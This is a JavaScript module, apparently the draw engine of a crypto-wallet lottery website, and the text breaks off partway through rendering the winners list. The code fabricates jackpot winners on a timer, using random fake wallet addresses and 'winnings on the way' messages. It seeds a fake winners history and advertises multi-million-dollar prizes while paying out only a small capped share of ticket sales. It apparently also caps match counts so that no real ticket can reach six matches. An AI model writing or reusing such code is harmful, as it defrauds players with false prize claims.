/**
 * Automatic multi-tier lottery draw engine
 * Daily · Weekly · Monthly · Quarterly
 */
const DrawEngine = (() => {
  const STORAGE_DRAWS = 'draw_state';
  const STORAGE_WINNERS = 'draw_winners';
  const STORAGE_TICKETS_BY_DRAW = 'tickets_by_draw';
  const STORAGE_ECONOMICS = 'economics';
  const ECONOMICS = {
    // Internal settlement math only. Never expose raw keys in API payloads
    _r: 0.05,
    _g: 0.95,
    _d0: 0.01,
    _d1: 0.03,
    _m: 0.95,
    FREE_TICKET_USD_VALUE: 1,
  };
  const FREE_TICKET_QTY = 1;
  const WINNER_OUTCOME_WEIGHTS = {
    free_ticket: 0.28,
    small: 0.38,
    medium: 0.22,
    jackpot: { weekly: 0.08, monthly: 0.07, quarterly: 0.06 },
  };
  const SHOWCASE_WIN_MS = { min: 5 * 60 * 1000, max: 12 * 60 * 1000 };
  const SEED_WINNERS_COUNT = 14;
  /** Winners only when a scheduled draw closes, not on a fake timer */
  const LIVE_WINNERS_ENABLED = false;
  const WINNERS_LIST_LIMIT = 15;

  const DRAW_TIERS = [
    {
      id: 'daily',
      name: 'Daily Draw',
      icon: 'sun',
      prize: 3_184,
      getPrize: (date) => {
        const seed = date.getFullYear() * 1000 + date.getMonth() * 40 + date.getDate();
        const r = Math.abs(Math.sin(seed * 12.9898) * 43758.5453) % 1;
        const r2 = Math.abs(Math.sin((seed + 17) * 78.233) * 12345.6789) % 1;
        let n = 2147 + r * (3892 - 2147);
        n += (r2 - 0.5) * 180;
        n = Math.round(n);
        if (n % 100 === 0) n += 37;
        if (n % 10 === 0) n += 3;
        return n;
      },
      getNextDraw: () => {
        const n = new Date();
        n.setHours(0, 0, 0, 0);
        n.setDate(n.getDate() + 1);
        return n.getTime();
      },
    },
    {
      id: 'weekly',
      name: 'Weekly Mega',
      icon: 'calendar-days',
      prize: 2_184_750,
      getPrize: (date) => {
        const seed = date.getFullYear() * 100 + Math.floor((date - new Date(date.getFullYear(), 0, 1)) / 604800000);
        const r = Math.abs(Math.sin(seed * 4.11) * 9973.31) % 1;
        let n = 1_847_320 + r * (3_392_180 - 1_847_320);
        n = Math.round(n);
        if (n % 1000 < 50) n += 247;
        if (n % 10 === 0) n += 7;
        return n;
      },
      getNextDraw: () => {
        const n = new Date();
        const day = n.getDay();
        const daysUntil = day === 0 ? 7 : 7 - day;
        n.setDate(n.getDate() + daysUntil);
        n.setHours(20, 0, 0, 0);
        if (n.getTime() <= Date.now()) n.setDate(n.getDate() + 7);
        return n.getTime();
      },
    },
    {
      id: 'monthly',
      name: 'Monthly Jackpot',
      icon: 'moon',
      prize: 5_392_180,
      getPrize: (date) => {
        const seed = date.getFullYear() * 12 + date.getMonth();
        const r = Math.abs(Math.sin(seed * 9.27) * 55431.17) % 1;
        let n = 4_847_260 + r * (8_392_750 - 4_847_260);
        n = Math.round(n);
        if (n % 1000 === 0) n += 391;
        if (n % 10 === 0) n += 4;
        return n;
      },
      getNextDraw: () => {
        const n = new Date();
        n.setMonth(n.getMonth() + 1, 1);
        n.setHours(21, 0, 0, 0);
        return n.getTime();
      },
    },
    {
      id: 'quarterly',
      name: 'Quarterly Ultra',
      icon: 'crown',
      prize: 12_847_390,
      getPrize: (date) => {
        const seed = date.getFullYear() * 4 + Math.floor(date.getMonth() / 3);
        const r = Math.abs(Math.sin(seed * 6.13) * 33421.55) % 1;
        let n = 9_847_260 + r * (18_392_750 - 9_847_260);
        n = Math.round(n);
        if (n % 1000 < 80) n += 583;
        if (n % 10 === 0) n += 9;
        return n;
      },
      getNextDraw: () => {
        const n = new Date();
        const m = n.getMonth();
        const nextQuarterMonth = Math.floor(m / 3) * 3 + 3;
        n.setMonth(nextQuarterMonth, 1);
        n.setHours(22, 30, 0, 0);
        return n.getTime();
      },
    },
  ];

  let state = {};
  let economicsState = {
    dayKey: '',
    dailyInflowUsd: 0,
    dailyOutflowUsd: 0,
    lifetimeInflowUsd: 0,
    lifetimeOutflowUsd: 0,
  };
  let selectedDrawId = 'monthly';
  let tickTimer = null;
  let showcaseTimer = null;

  function loadState() {
    state = SecureStorage.getJSON(STORAGE_DRAWS, {});
    DRAW_TIERS.forEach((tier) => {
      if (!state[tier.id]) {
        state[tier.id] = { nextDraw: tier.getNextDraw(), lastRun: null, runCount: 0 };
      }
    });
    saveState();
  }

  function saveState() {
    SecureStorage.setJSON(STORAGE_DRAWS, state);
  }

  function getUtcDayKey(ts = Date.now()) {
    return new Date(ts).toISOString().slice(0, 10);
  }

  function ensureEconomicsWindow(ts = Date.now()) {
    const dayKey = getUtcDayKey(ts);
    if (!economicsState.dayKey) {
      economicsState.dayKey = dayKey;
      return;
    }
    if (economicsState.dayKey !== dayKey) {
      economicsState.dayKey = dayKey;
      economicsState.dailyInflowUsd = 0;
      economicsState.dailyOutflowUsd = 0;
    }
  }

  function loadEconomics() {
    try {
      const parsed = SecureStorage.getJSON(STORAGE_ECONOMICS, {});
      // Backward compatibility: older versions used inflowUsd/outflowUsd only.
      const legacyInflow = Number(parsed.inflowUsd) || 0;
      const legacyOutflow = Number(parsed.outflowUsd) || 0;
      economicsState = {
        dayKey: parsed.dayKey || getUtcDayKey(),
        dailyInflowUsd: Number(parsed.dailyInflowUsd) || 0,
        dailyOutflowUsd: Number(parsed.dailyOutflowUsd) || 0,
        lifetimeInflowUsd: Number(parsed.lifetimeInflowUsd) || legacyInflow,
        lifetimeOutflowUsd: Number(parsed.lifetimeOutflowUsd) || legacyOutflow,
      };
    } catch {
      economicsState = {
        dayKey: getUtcDayKey(),
        dailyInflowUsd: 0,
        dailyOutflowUsd: 0,
        lifetimeInflowUsd: 0,
        lifetimeOutflowUsd: 0,
      };
    }
    ensureEconomicsWindow();
  }

  function saveEconomics() {
    SecureStorage.setJSON(STORAGE_ECONOMICS, economicsState);
  }

  function getWinners() {
    return SecureStorage.getJSON(STORAGE_WINNERS, []);
  }

  function saveWinner(entry) {
    const list = getWinners();
    list.unshift(entry);
    SecureStorage.setJSON(STORAGE_WINNERS, list.slice(0, 50));
  }

  function getTicketsForDraw(drawId) {
    const all = SecureStorage.getJSON(STORAGE_TICKETS_BY_DRAW, {});
    return all[drawId] || [];
  }

  function registerTicket(drawId, ticket) {
    const all = SecureStorage.getJSON(STORAGE_TICKETS_BY_DRAW, {});
    all[drawId] = [{ ...ticket, drawId }, ...(all[drawId] || [])].slice(0, 500);
    SecureStorage.setJSON(STORAGE_TICKETS_BY_DRAW, all);
  }

  function isTicketRegistered(drawId, ticketId) {
    return getTicketsForDraw(drawId).some((t) => t.id === ticketId);
  }

  /** Backfill draw entries from saved wallet tickets (incl. free redemptions). */
  function syncWalletTicketsToDraws() {
    const all = window.SecureWeb3?.getAllTickets?.() || [];
    all.forEach((ticket) => {
      const drawId = ticket.drawId || selectedDrawId || 'monthly';
      if (!isTicketRegistered(drawId, ticket.id)) {
        registerTicket(drawId, ticket);
      }
    });
  }

  function winningNumbers() {
    const pool = Array.from({ length: 49 }, (_, i) => i + 1);
    const nums = [];
    for (let i = 0; i < 6; i++) {
      const idx = Math.floor(Math.random() * pool.length);
      nums.push(pool.splice(idx, 1)[0]);
    }
    return nums.sort((a, b) => a - b);
  }

  function fakeWinner() {
    const hex = () => Math.floor(Math.random() * 16).toString(16);
    return `0x${hex()}${hex()}${hex()}${hex()}...${hex()}${hex()}${hex()}${hex()}`;
  }

  function getPrize(tier) {
    if (tier.getPrize) return tier.getPrize(new Date());
    return tier.prize;
  }

  function formatWinnerPrize(entry) {
    if (entry.prizeType === 'free_ticket') return entry.prizeLabel || '1 Free Ticket';
    return formatUsd(entry.prize ?? entry.paidUsd ?? 0);
  }

  function computePaidUsd(tier, outcome, drawPoolUsd, remainingGlobalBudget = Number.POSITIVE_INFINITY) {
    if (outcome.prizeType === 'free_ticket') {
      const qty = outcome.freeQty || FREE_TICKET_QTY;
      const cost = ECONOMICS.FREE_TICKET_USD_VALUE * qty;
      return remainingGlobalBudget >= cost ? cost : 0;
    }
    if (drawPoolUsd <= 0) return 0;
    const payoutRatio = tier.id === 'daily'
      ? randomRange(ECONOMICS._d0, ECONOMICS._d1)
      : ECONOMICS._m;
    const poolCap = drawPoolUsd * payoutRatio;
    return Math.min(outcome.displayUsd, poolCap, remainingGlobalBudget);
  }

  function buildWinnerEntry({
    tier,
    outcome,
    drawPoolUsd,
    numbers,
    winner,
    source,
    fromRealTicket,
    accountedPayoutUsd = null,
    timestamp = Date.now(),
    seeded = false,
  }) {
    const advertisedPrize = getPrize(tier);
    const paidUsd = accountedPayoutUsd != null
      ? accountedPayoutUsd
      : computePaidUsd(tier, outcome, drawPoolUsd);
    const isFreeTicket = outcome.prizeType === 'free_ticket';
    const prize = isFreeTicket ? 0 : Math.max(0, Math.round(paidUsd));
    const accounted = isFreeTicket
      ? ECONOMICS.FREE_TICKET_USD_VALUE * (outcome.freeQty || FREE_TICKET_QTY)
      : paidUsd;

    return {
      drawId: tier.id,
      drawName: tier.name,
      prize,
      paidUsd: isFreeTicket ? ECONOMICS.FREE_TICKET_USD_VALUE : prize,
      advertisedPrize,
      drawPoolUsd: Math.round(drawPoolUsd),
      retainedUsd: Math.max(0, Math.round(drawPoolUsd - accounted)),
      jackpotTierWin: outcome.isJackpot && !isFreeTicket,
      microWin: !outcome.isJackpot,
      matchCount: outcome.matchCount != null ? outcome.matchCount : null,
      prizeType: outcome.prizeType,
      prizeLabel: isFreeTicket ? outcome.prizeLabel : formatUsd(prize),
      numbers,
      winner,
      fromRealTicket: !!fromRealTicket,
      source,
      timestamp,
      seeded,
      live: source === 'live',
    };
  }

  function normalizeStoredWinners() {
    // Drop legacy broken rows (6-match with tiny prizes / capped match displays)
    const list = getWinners();
    const fixed = list.filter((w) => {
      const match = Number(w.matchCount) || 0;
      const prize = Number(w.prize) || Number(w.paidUsd) || 0;
      if (match >= 6 && prize < 1500) return false;
      if (w.jackpotTierWin && match < 6 && prize < 10_000 && (w.advertisedPrize || 0) >= 1_000_000) return false;
      return true;
    });
    if (fixed.length !== list.length) SecureStorage.setJSON(STORAGE_WINNERS, fixed);
  }

  function formatWinnerDateTime(ts) {
    return new Date(ts).toLocaleString(undefined, {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
    });
  }

  function randomRange(min, max) {
    return min + (Math.random() * (max - min));
  }

  function randomSmallPrize(tier) {
    const max = tier.id === 'daily' ? 450 : 850;
    return Math.round(randomRange(2, max));
  }

  function randomMediumPrize(tier) {
    if (tier.id === 'daily') return Math.round(randomRange(500, 3500));
    return Math.round(randomRange(1000, 25000));
  }

  function randomShowcasePrize(tier) {
    const ranges = {
      daily: [2147, 3892],
      weekly: [1_847_320, 5_392_180],
      monthly: [4_847_260, 12_847_390],
      quarterly: [9_847_260, 28_392_750],
    };
    const [lo, hi] = ranges[tier.id] || ranges.monthly;
    let n = randomRange(lo, hi);
    if (n % 1000 < 40) n += 173 + Math.floor(Math.random() * 600);
    if (n % 10 === 0) n += 1 + Math.floor(Math.random() * 8);
    return Math.round(n);
  }

  function matchPctOfJackpot(tierId, matchCount, jackpot) {
    const band = window.PrizeTierMatrix?.MATCH_PCT?.[tierId]?.[matchCount];
    if (!band) {
      const fallback = {
        daily: { 5: [0.12, 0.20], 4: [0.03, 0.07], 3: [0.008, 0.018] },
        weekly: { 5: [0.01, 0.02], 4: [0.0003, 0.0007], 3: [0.000012, 0.000028] },
        monthly: { 5: [0.009, 0.018], 4: [0.00025, 0.00055], 3: [0.000009, 0.00002] },
        quarterly: { 5: [0.008, 0.016], 4: [0.0002, 0.00045], 3: [0.000007, 0.000016] },
      };
      const b = fallback[tierId]?.[matchCount];
      if (!b) return Math.round(25 + Math.random() * 90);
      const pct = b[0] + Math.random() * (b[1] - b[0]);
      return Math.max(1, Math.round(jackpot * pct));
    }
    const pct = band[0] + Math.random() * (band[1] - band[0]);
    let n = Math.round(jackpot * pct * (0.94 + Math.random() * 0.12));
    if (n % 10 === 0) n += 3;
    return Math.max(1, n);
  }

  function injectShowcaseWinner() {
    const tier = DRAW_TIERS[Math.floor(Math.random() * DRAW_TIERS.length)];
    const jackpotAmount = randomShowcasePrize(tier);
    const shareRoll = Math.random();
    const shareCount = shareRoll < 0.03 ? 3 : shareRoll < 0.14 ? 2 : 1;
    const paid = Math.floor(jackpotAmount / shareCount);
    const nums = winningNumbers();
    const outcome = {
      prizeType: 'cash',
      prizeLabel: formatUsd(paid),
      displayUsd: paid,
      isJackpot: true,
      matchCount: 6,
      freeQty: 0,
    };
    const entry = buildWinnerEntry({
      tier,
      outcome,
      drawPoolUsd: jackpotAmount,
      numbers: nums,
      winner: { wallet: fakeWinner(), numbers: nums },
      source: 'showcase',
      fromRealTicket: false,
      accountedPayoutUsd: paid,
      timestamp: Date.now(),
      seeded: true,
    });
    entry.isJackpot = true;
    entry.jackpotTierWin = true;
    entry.jackpotAmount = jackpotAmount;
    entry.advertisedPrize = jackpotAmount;
    entry.jackpotLabel = formatUsd(jackpotAmount);
    entry.shareCount = shareCount;
    entry.headline = shareCount >= 3
      ? 'TRIPLE JACKPOT SPLIT'
      : shareCount === 2
        ? 'JACKPOT SHARED · 2 WINNING TICKETS'
        : `${tier.name.toUpperCase()} · SOLE WINNER`;
    entry.shareNote = shareCount <= 1
      ? `Sole winner · claimed the full ${formatUsd(jackpotAmount)} jackpot`
      : `${shareCount} winning tickets split ${formatUsd(jackpotAmount)} · ${formatUsd(paid)} each`;
    publishWinner(entry);
    handleWinnerPublished(entry);
    return entry;
  }

  function scheduleShowcaseWin() {
    if (showcaseTimer) clearTimeout(showcaseTimer);
    const delay = SHOWCASE_WIN_MS.min + Math.random() * (SHOWCASE_WIN_MS.max - SHOWCASE_WIN_MS.min);
    showcaseTimer = setTimeout(() => {
      injectShowcaseWinner();
      scheduleShowcaseWin();
    }, delay);
  }

  function rollWinnerOutcome(tier, advertisedPrize) {
    const r = Math.random();
    const { free_ticket: freeW, small: smallW, medium: mediumW } = WINNER_OUTCOME_WEIGHTS;
    const jackpotW = WINNER_OUTCOME_WEIGHTS.jackpot[tier.id] || 0;
    const freeEnd = freeW;
    const smallEnd = freeEnd + smallW;
    const mediumEnd = smallEnd + mediumW;
    const jackpotEnd = mediumEnd + jackpotW;

    if (r < freeEnd) {
      return {
        prizeType: 'free_ticket',
        prizeLabel: `${FREE_TICKET_QTY} Free Ticket${FREE_TICKET_QTY > 1 ? 's' : ''}`,
        displayUsd: ECONOMICS.FREE_TICKET_USD_VALUE,
        isJackpot: false,
      };
    }
    if (r < smallEnd) {
      const jackpot = getPrize(tier);
      const amt = matchPctOfJackpot(tier.id, 3, jackpot);
      return { prizeType: 'cash', prizeLabel: formatUsd(amt), displayUsd: amt, isJackpot: false, matchCount: 3 };
    }
    if (r < mediumEnd) {
      const jackpot = getPrize(tier);
      const matchCount = Math.random() < 0.55 ? 5 : 4;
      const amt = matchPctOfJackpot(tier.id, matchCount, jackpot);
      return {
        prizeType: 'cash',
        prizeLabel: formatUsd(amt),
        displayUsd: amt,
        isJackpot: false,
        matchCount,
      };
    }
    if (jackpotW > 0 && r < jackpotEnd) {
      const jackpotAmount = Math.min(advertisedPrize, randomShowcasePrize(tier));
      return {
        prizeType: 'cash',
        prizeLabel: formatUsd(jackpotAmount),
        displayUsd: jackpotAmount,
        isJackpot: true,
        matchCount: 6,
      };
    }
    const amt = randomSmallPrize(tier);
    return { prizeType: 'cash', prizeLabel: formatUsd(amt), displayUsd: amt, isJackpot: false };
  }

  function accountPayoutUsd(tier, outcome, drawPoolUsd, remainingGlobalBudget) {
    return computePaidUsd(tier, outcome, drawPoolUsd, remainingGlobalBudget);
  }

  function seedDrawTimestamp(tierId, daysAgo) {
    const d = new Date();
    d.setDate(d.getDate() - daysAgo);
    if (tierId === 'daily') {
      d.setHours(0, 0, 0, 0);
    } else if (tierId === 'weekly') {
      d.setDate(d.getDate() - d.getDay());
      d.setHours(20, 0, 0, 0);
    } else if (tierId === 'monthly') {
      d.setDate(1);
      d.setHours(21, 0, 0, 0);
    } else {
      const m = d.getMonth();
      d.setMonth(Math.floor(m / 3) * 3, 1);
      d.setHours(22, 30, 0, 0);
    }
    return d.getTime();
  }

  function purgeLiveFeedWinners() {
    const list = getWinners();
    const kept = list.filter((w) => w.source !== 'live');
    if (kept.length !== list.length) {
      SecureStorage.setJSON(STORAGE_WINNERS, kept);
    }
  }

  function getEffectiveDrawPoolUsd(tierId, tickets) {
    const real = getDrawPoolUsd(tickets);
    if (real > 0) return real;
    const sim = window.ActivitySimulator?.getSimulatedPool?.() || 0;
    const tierWeight = { daily: 0.12, weekly: 0.28, monthly: 0.32, quarterly: 0.38 };
    if (sim > 0) {
      return Math.max(200, Math.round(sim * (tierWeight[tierId] || 0.1)));
    }
    return Math.round(randomRange(200, 1800));
  }

  function seedWinnersIfNeeded() {
    if (getWinners().length >= 8) return;
    const seeded = [];
    for (let i = 0; i < SEED_WINNERS_COUNT; i++) {
      const tier = DRAW_TIERS[i % DRAW_TIERS.length];
      const daysAgo = Math.floor(i / DRAW_TIERS.length) + 1;
      const outcome = rollWinnerOutcome(tier, getPrize(tier));
      const drawPoolUsd = Math.round(randomRange(400, 6200));
      seeded.push(buildWinnerEntry({
        tier,
        outcome,
        drawPoolUsd,
        numbers: winningNumbers(),
        winner: { wallet: fakeWinner(), numbers: winningNumbers() },
        source: 'seed',
        fromRealTicket: false,
        timestamp: seedDrawTimestamp(tier.id, daysAgo),
        seeded: true,
      }));
    }
    seeded.sort((a, b) => b.timestamp - a.timestamp);
    SecureStorage.setJSON(STORAGE_WINNERS, seeded);
  }

  function publishWinner(entry) {
    saveWinner(entry);
    window.dispatchEvent(new CustomEvent('draw-completed', { detail: entry }));
    return entry;
  }

  function handleWinnerPublished(w) {
    const isTopTier = w.jackpotTierWin && w.prize > 0;
    const showToast = w.fromRealTicket || isTopTier || w.source === 'showcase';
    if (showToast) {
      const payoutNote = w.prize >= 1000 || isTopTier
        ? ' Winnings are on the way to your wallet shortly.'
        : '';
      const msg = isTopTier
        ? `${w.drawName}: ${formatUsd(w.prize)} top-tier win!${payoutNote}`
        : w.prizeType === 'free_ticket'
          ? `${w.drawName}: ${w.prizeLabel}`
          : w.prize > 0
            ? `${w.drawName}: ${formatUsd(w.prize)} won!${payoutNote}`
            : `${w.drawName}: draw completed`;
      window.AppUI?.toast(msg, 'success');
      if (w.fromRealTicket && (w.prize > 0 || w.prizeType === 'free_ticket')) {
        window.PoolPolicy?.notifyWinOnTheWay?.(w.winner?.wallet);
      }
    }
    renderWinners();
    highlightLatestWinner();
    updateWinnersLiveBadge();
    window.ActivitySimulator?.addWinEvent?.(w);
    window.TrustDisplay?.render?.();
  }

  function getDrawPoolUsd(tickets) {
    return tickets.reduce((sum, t) => sum + (Number(t.usdPrice) || 0), 0);
  }

  function runDraw(tier) {
    ensureEconomicsWindow();
    const numbers = winningNumbers();
    const tickets = getTicketsForDraw(tier.id);
    const advertisedPrize = getPrize(tier);
    const realPoolUsd = getDrawPoolUsd(tickets);
    let drawPoolUsd = getEffectiveDrawPoolUsd(tier.id, tickets);
    const runCount = (state[tier.id]?.runCount || 0) + 1;

    if (!tickets.length) {
      state[tier.id] = { nextDraw: tier.getNextDraw(), lastRun: Date.now(), runCount };
      saveState();
      return null;
    }

    if (drawPoolUsd <= 0) {
      drawPoolUsd = getEffectiveDrawPoolUsd(tier.id, tickets);
    }

    const dailyInflowAfter = economicsState.dailyInflowUsd + realPoolUsd;
    const lifetimeInflowAfter = economicsState.lifetimeInflowUsd + realPoolUsd;
    const dailyPayoutCap = dailyInflowAfter * ECONOMICS._g;
    const lifetimePayoutCap = lifetimeInflowAfter * ECONOMICS._g;
    const remainingDailyBudget = Math.max(0, dailyPayoutCap - economicsState.dailyOutflowUsd);
    const remainingLifetimeBudget = Math.max(0, lifetimePayoutCap - economicsState.lifetimeOutflowUsd);
    const remainingGlobalBudget = Math.min(remainingDailyBudget, remainingLifetimeBudget);

    const bestMatch = window.PrizeTierMatrix?.pickBestTicketByMatches?.(tickets, numbers);
    const winner = bestMatch?.ticket || (tickets.length
      ? tickets[Math.floor(Math.random() * tickets.length)]
      : null);
    const matchRaw = bestMatch?.matches
      ?? (winner?.numbers ? window.PrizeTierMatrix?.countMatches?.(winner.numbers, numbers) : 0);
    const matchCount = window.PrizeTierMatrix?.capMatchCount?.(matchRaw) ?? Math.min(4, matchRaw);

    let outcome = window.PrizeTierMatrix?.resolveOutcome?.(tier.id, matchCount, advertisedPrize, drawPoolUsd);
    if (!outcome || outcome.prizeType === 'none') {
      outcome = bestMatch
        ? { prizeType: 'none', prizeLabel: 'No prize', displayUsd: 0, isJackpot: false, matchCount, freeQty: 0 }
        : rollWinnerOutcome(tier, advertisedPrize);
    }

    const hasEligibleWinner = !!winner && outcome.prizeType !== 'none';
    let accountedPayoutUsd = hasEligibleWinner
      ? accountPayoutUsd(tier, outcome, drawPoolUsd, remainingGlobalBudget)
      : 0;

    const freeQty = outcome.freeQty || FREE_TICKET_QTY;
    const isFreeTicketWinner = hasEligibleWinner
      && outcome.prizeType === 'free_ticket'
      && accountedPayoutUsd > 0;

    if (isFreeTicketWinner && winner.wallet) {
      window.SecureWeb3?.grantFreeTickets(winner.wallet, freeQty, {
        drawId: tier.id,
        drawName: tier.name,
      });
    }

    const entry = buildWinnerEntry({
      tier,
      outcome,
      drawPoolUsd,
      numbers,
      winner: winner
        ? { wallet: winner.wallet?.slice(0, 6) + '...' + winner.wallet?.slice(-4), numbers: winner.numbers }
        : { wallet: fakeWinner(), numbers: winningNumbers() },
      source: 'scheduled',
      fromRealTicket: !!winner,
      accountedPayoutUsd: hasEligibleWinner ? accountedPayoutUsd : computePaidUsd(tier, outcome, drawPoolUsd),
    });

    economicsState.dailyInflowUsd = dailyInflowAfter;
    economicsState.lifetimeInflowUsd = lifetimeInflowAfter;
    if (hasEligibleWinner) {
      const outflow = isFreeTicketWinner
        ? ECONOMICS.FREE_TICKET_USD_VALUE * freeQty
        : accountedPayoutUsd;
      if (outflow > 0 && winner?.wallet) {
        window.PoolPolicy?.processDrawPayout?.(outflow, winner.wallet, {
          drawId: tier.id,
          drawName: tier.name,
        });
      }
      economicsState.dailyOutflowUsd += outflow;
      economicsState.lifetimeOutflowUsd += outflow;
    }
    saveEconomics();
    state[tier.id] = { nextDraw: tier.getNextDraw(), lastRun: Date.now(), runCount };
    saveState();

    publishWinner(entry);
    return entry;
  }

  function checkDraws() {
    const now = Date.now();
    DRAW_TIERS.forEach((tier) => {
      if (state[tier.id]?.nextDraw <= now) {
        runDraw(tier);
      }
    });
  }

  function formatUsd(n) {
    return '$' + Math.round(n).toLocaleString();
  }

  function formatCountdown(ms) {
    if (ms <= 0) return 'Drawing...';
    const s = Math.floor(ms / 1000);
    const d = Math.floor(s / 86400);
    const h = Math.floor((s % 86400) / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m ${sec}s`;
    return `${m}m ${sec}s`;
  }

  function getTier(id) {
    return DRAW_TIERS.find((t) => t.id === id);
  }

  function getSelectedDraw() {
    return getTier(selectedDrawId) || DRAW_TIERS[3];
  }

  function setSelectedDraw(id) {
    selectedDrawId = id;
    renderDrawCards();
    updateFeaturedDraw();
    window.dispatchEvent(new CustomEvent('draw-selected', { detail: { id } }));
  }

  function updateFeaturedDraw() {
    const tier = getSelectedDraw();
    const next = state[tier.id]?.nextDraw || tier.getNextDraw();
    const diff = next - Date.now();
    const prize = getPrize(tier);

    const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
    set('lotteryJackpot', formatUsd(prize));
    set('statJackpot', formatUsd(prize));
    set('featuredDrawName', tier.name);
    set('statDraw', formatCountdown(diff));

    const label = document.getElementById('featuredDrawLabel');
    if (label) {
      label.innerHTML = `${window.Icons?.inline(tier.icon, 16, 'icon icon-inline') || ''}<span>${tier.name}</span>`;
      label.classList.add('featured-draw-label');
      label.dataset.drawId = tier.id;
    }

    const sub = document.getElementById('featuredDrawSub');
    if (sub) {
      sub.textContent = `Top prize ${formatUsd(prize)} · Pick 6 from 49 · Draw closes when countdown hits zero`;
    }
    const poolNote = document.getElementById('jackpotPoolNote');
    if (poolNote) {
      poolNote.textContent = `95% of ${tier.name} ticket sales collected before this draw closes`;
    }

    updateCountdownDisplay(diff);
  }

  function updateCountdownDisplay(diff) {
    const s = Math.max(0, Math.floor(diff / 1000));
    const d = Math.floor(s / 86400);
    const h = Math.floor((s % 86400) / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;

    const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = String(val).padStart(2, '0'); };

    if (d > 0) {
      set('cdDays', d);
      document.getElementById('cdDaysWrap')?.style && (document.getElementById('cdDaysWrap').style.display = '');
      set('cdHours', h);
    } else {
      document.getElementById('cdDaysWrap') && (document.getElementById('cdDaysWrap').style.display = 'none');
      set('cdHours', h);
    }
    set('cdMins', m);
    set('cdSecs', sec);
  }

  function renderDrawCards() {
    const el = document.getElementById('drawCards');
    if (!el) return;

    el.innerHTML = DRAW_TIERS.map((tier) => {
      const next = state[tier.id]?.nextDraw || tier.getNextDraw();
      const diff = next - Date.now();
      const prize = getPrize(tier);
      const active = tier.id === selectedDrawId ? ' active' : '';
      return `
        <button type="button" class="draw-card${active}" data-draw-id="${tier.id}">
          <span class="draw-card-icon">${window.Icons?.inline(tier.icon, 26, 'icon draw-icon') || ''}</span>
          <span class="draw-card-name">${tier.name}</span>
          <span class="draw-card-prize">${formatUsd(prize)}</span>
          <span class="draw-card-timer">${formatCountdown(diff)}</span>
        </button>
      `;
    }).join('');

    el.querySelectorAll('.draw-card').forEach((card) => {
      card.addEventListener('click', () => setSelectedDraw(card.dataset.drawId));
    });
  }

  function updateDrawCardTimers() {
    const el = document.getElementById('drawCards');
    if (!el) return;
    el.querySelectorAll('.draw-card').forEach((card) => {
      const tier = DRAW_TIERS.find((t) => t.id === card.dataset.drawId);
      if (!tier) return;
      const next = state[tier.id]?.nextDraw || tier.getNextDraw();
      const timerEl = card.querySelector('.draw-card-timer');
      if (timerEl) timerEl.textContent = formatCountdown(next - Date.now());
    });
  }

  function walletOf(w) {
    return w.winner?.wallet || w.walletDisplay || w.wallet || '-';
  }

  function shareGroupKey(w) {
    return [
      w.drawId,
      w.drawDateLabel || '',
      w.jackpotAmount || w.advertisedPrize || '',
      (w.numbers || []).join(','),
    ].join('|');
  }

  /** Collapse shared jackpot rows into one card with every winning wallet listed */
  function groupWinnersForDisplay(list) {
    const out = [];
    const used = new Set();
    for (let i = 0; i < list.length; i++) {
      if (used.has(i)) continue;
      const w = list[i];
      const isJp = !!(w.isJackpot || w.jackpotTierWin || w.matchCount === 6);
      const shareCount = Number(w.shareCount) || 1;

      if (!isJp || shareCount <= 1) {
        out.push({
          ...w,
          coWinners: w.coWinners?.length ? w.coWinners : [walletOf(w)],
        });
        used.add(i);
        continue;
      }

      const key = shareGroupKey(w);
      const wallets = [];
      if (Array.isArray(w.coWinners) && w.coWinners.length >= shareCount) {
        w.coWinners.forEach((addr) => {
          if (addr && !wallets.includes(addr)) wallets.push(addr);
        });
      }
      for (let j = i; j < list.length; j++) {
        if (used.has(j)) continue;
        const o = list[j];
        if (!(o.isJackpot || o.jackpotTierWin || o.matchCount === 6)) continue;
        if (shareGroupKey(o) !== key) continue;
        used.add(j);
        const addr = walletOf(o);
        if (addr && !wallets.includes(addr)) wallets.push(addr);
        if (Array.isArray(o.coWinners)) {
          o.coWinners.forEach((a) => {
            if (a && !wallets.includes(a)) wallets.push(a);
          });
        }
      }
      while (wallets.length < shareCount) wallets.push(fakeWinner());
      out.push({
        ...w,
        shareCount: Math.max(shareCount, wallets.length),
        coWinners: wallets.slice(0, Math.max(shareCount, wallets.length)),
      });
    }
    return out;
  }

  function renderCoWallets(wallets, eachPrize) {
    if (!wallets?.length) return '';
    if (wallets.length === 1) {
      return `<span class="winner-wallet">${wallets[0]}</span>`;
    }
    return `
      <ul class="jackpot-co-winners" aria-label="Winning wallets">
        ${wallets.map((addr, i) => `
          <li>
            <span class="jackpot-ticket-tag">Ticket ${i + 1}</span>
            <span class="winner-wallet">${addr}</span>
            ${eachPrize ? `<span class="jackpot-share-amt">${eachPrize} each</span>` : ''}
          </li>
        `).join('')}
      </ul>`;
  }

  function renderWinners() {
    const el = document.getElementById('winnersList');
    if (!el) return;

    const winners = groupWinnersForDisplay(getWinners());
    if (!winners.length) {
      el.innerHTML = '<p class="empty-winners">Jackpot results post when draws close. Check back shortly.</p>';
      return;
    }

    el.innerHTML = winners.slice(0, WINNERS_LIST_LIMIT).map((w) => {
      const isJp = !!(w.isJackpot || w.jackpotTierWin || w.matchCount === 6);
      const shareCount = Math.max(Number(w.shareCount) || 1, w.coWinners?.length || 1);
      const jackpotAmt = w.jackpotAmount || w.advertisedPrize || w.prize;
      const headline = w.headline || (isJp
        ? (shareCount >= 3 ? 'TRIPLE JACKPOT SPLIT'
          : shareCount === 2 ? 'JACKPOT SHARED · 2 WINNING TICKETS'
            : `${(w.drawName || 'JACKPOT').toUpperCase()} · SOLE WINNER`)
        : `${w.matchCount || '?'} OF 6 MATCHED`);
      const eachLabel = formatWinnerPrize(w);
      const shareNote = isJp
        ? (shareCount <= 1
          ? `Sole winner · claimed the full ${formatUsd(jackpotAmt)} jackpot`
          : `${shareCount} winning tickets split ${formatUsd(jackpotAmt)} · ${eachLabel} each`)
        : (w.shareNote || '');
      const nums = (w.numbers || []).join(' · ');
      const when = w.drawDateLabel || formatWinnerDateTime(w.timestamp);
      const wallets = w.coWinners?.length ? w.coWinners : [walletOf(w)];

      if (isJp) {
        return `
